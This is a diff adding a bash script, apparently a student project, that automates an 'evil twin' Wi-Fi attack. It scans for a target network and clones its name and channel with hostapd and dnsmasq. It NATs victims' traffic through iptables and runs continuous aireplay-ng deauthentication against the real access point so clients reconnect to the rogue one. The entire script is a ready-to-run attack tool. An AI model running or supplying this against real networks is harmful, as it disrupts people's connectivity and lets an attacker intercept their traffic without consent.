@@ -1,0 +1,106 @@
+#!/bin/bash
+
+echo "This is an Eviltwin Framework program by student by ESTI ANTANIMENA 
+--------------------------------------------------------------------------
+   version beta 1.0 / Sarobidy / Nantenaina / Olivier L2 RSI MVT  "
+
+
+echo -e "Démarrage mode monitor (airmon-ng) ..."
+airmon-ng check kill >/dev/null 2>&1
+airmon-ng 
+
+echo "================================================================================"
+echo "|          Veuillez entrer le carte réseaux pour la désauthetification         |"
+echo "================================================================================"
+read wlan_interface
+
+airmon-ng start $wlan_interface >/dev/null 2>&1
+
+
+
+echo "=============================================================================================================="
+echo "|                Scan en cours | pressez Ctrl + C après avoir repérez le BSSID de votre choix                |"
+echo "=============================================================================================================="
+
+sleep 3
+wlan_interface_mon="${wlan_interface}mon"
+airodump-ng $wlan_interface_mon
+
+echo "================================================================================"
+echo "|                Veuillez completer les informations ci-dessous                |"
+echo "================================================================================"
+
+
+echo "BSSID CIBLE :"
+echo "---------------------------"
+read bssid
+
+echo "ESSID CIBLE :"
+echo "---------------------------"
+read essid
+
+
+echo "Channel CIBLE :"
+echo "----------------------------"
+read channel
+
+
+
+sleep 1
+airmon-ng
+echo "================================================================================"
+echo "|             Veuillez entrer le carte réseaux pour l'ACCESS POINT             |"
+echo "================================================================================"   
+
+read wlan2_interface    
+
+
+echo "================================================================================"
+echo "|                     Configuration du jumeaux maléfique                       |"
+echo "================================================================================"
+
+
+mkdir /root/eviltwinfram >/dev/null 2>&1
+echo "configuration dnsmasq en cours ... "
+
+echo "interface=$wlan2_interface
+dhcp-range=10.0.0.20,10.0.0.250,255.255.255.0,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+" > /root/eviltwinfram/dnsmasq.conf
+
+
+echo "configuration access point en cours ... "
+
+echo "interface=$wlan2_interface
+driver=nl80211
+ssid=$essid
+channel=$channel
+macaddr_acl=0
+ignore_broadcast_ssid=0
+auth_algs=1
+" > /root/eviltwinfram/hostapd.conf
+
+
+echo -ne "Loading ...."
+killall dnsmasq >/dev/null 2>&1
+sleep 5;
+ifconfig $wlan2_interface 10.0.0.1 netmask 255.255.255.0 up &
+iptables --flush
+iptables -t nat --flush
+iptables --delete-chain
+iptables -t nat --delete-chain
+iptables -t nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables --append FORWARD --in-interface $wlan2_interface -j ACCEPT
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iwconfig $wlan_interface_mon channel $channel
+
+
+xterm -hold -e "airodump-ng --bssid $bssid --channel $channel $wlan_interface_mon" & xterm -hold -e "aireplay-ng -0 0 -a $bssid $wlan_interface_mon" & xterm -hold -e "dnsmasq -C /root/eviltwinfram/dnsmasq.conf -d" & xterm -hold -e "hostapd /root/eviltwinfram/hostapd.conf"
+ 
+
+
